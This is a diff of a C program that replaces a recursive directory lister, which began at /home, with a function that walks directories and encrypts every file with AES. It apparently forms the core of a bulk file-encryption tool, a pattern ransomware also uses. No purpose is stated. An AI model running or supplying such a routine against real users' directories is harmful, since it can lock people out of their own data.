@@ -7,6 +7,7 @@
 #include <string.h>
 #include <errno.h>
 #include <stdbool.h>
+#include "crypto.h"
 
 bool isFile(char *name){
     //printf("Dirctory test name: ~%s~\n", name);
@@ -25,18 +26,15 @@ bool isFile(char *name){
 
 int files = 0;
 
-void readR(char *path){
+void scanAndCrypt(char *path, unsigned char *key, bool encrypt){
     DIR *dr = opendir(path);
     struct dirent *de;
 
-    if (dr == NULL)  // opendir returns NULL if couldn't open directory
+    if (dr == NULL)
     {
         printf("Could not open current directory\n" );
         return;
     }
-    // Refer http://pubs.opengroup.org/onlinepubs/7990989775/xsh/readdir.html
-    // for readdir()
-    struct stat fileStat;
 
     while ((de = readdir(dr)) != NULL){
 
@@ -45,49 +43,17 @@ void readR(char *path){
             strcat(pathName, "/");
             strcat(pathName, de->d_name);
 
-
-            //printf("\n\n\n%s : %lu \n", de->d_name, de->d_ino);
-            fileStat.st_mode = 0;
-            stat(pathName,&fileStat);
-
-            //if(!isFile(pathName)) printf("This file is a deirectry!\n");
-            //else  printf("This file is not a deirectry!\n");
-
             if(strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
                 continue;
             if(isFile(pathName)){
-                /*printf("Information for %s\n",de->d_name);
-                printf("---------------------------\n");
-                printf("Path : %s\n", path);
-                printf("File Permissions: \t");
-                printf( (S_ISDIR(fileStat.st_mode)) ? "d" : "-");
-                printf( (fileStat.st_mode & S_IRUSR) ? "r" : "-");
-                printf( (fileStat.st_mode & S_IWUSR) ? "w" : "-");
-                printf( (fileStat.st_mode & S_IXUSR) ? "x" : "-");
-                printf( (fileStat.st_mode & S_IRGRP) ? "r" : "-");
-                printf( (fileStat.st_mode & S_IWGRP) ? "w" : "-");
-                printf( (fileStat.st_mode & S_IXGRP) ? "x" : "-");
-                printf( (fileStat.st_mode & S_IROTH) ? "r" : "-");
-                printf( (fileStat.st_mode & S_IWOTH) ? "w" : "-");
-                printf( (fileStat.st_mode & S_IXOTH) ? "x" : "-");
-                printf("\n"); */
-                files++;
+                if(encrypt)
+                    encryptAES(pathName, key);
             }
             else {
                 //printf("\n\nEntering dir: ~%s~\n\n", pathName);
-                readR(pathName);
+                scanAndCrypt(pathName, key, encrypt);
             }
 
     }
-
     closedir(dr);
-}
-
-int main(int n, char *args[n]){
-     setbuf(stdout, NULL);
-       // Pointer for directory entry
-     readR("/home");
-     printf("files %d\n", files);
-    // opendir() returns a pointer of DIR type.
-    return 0;
 }
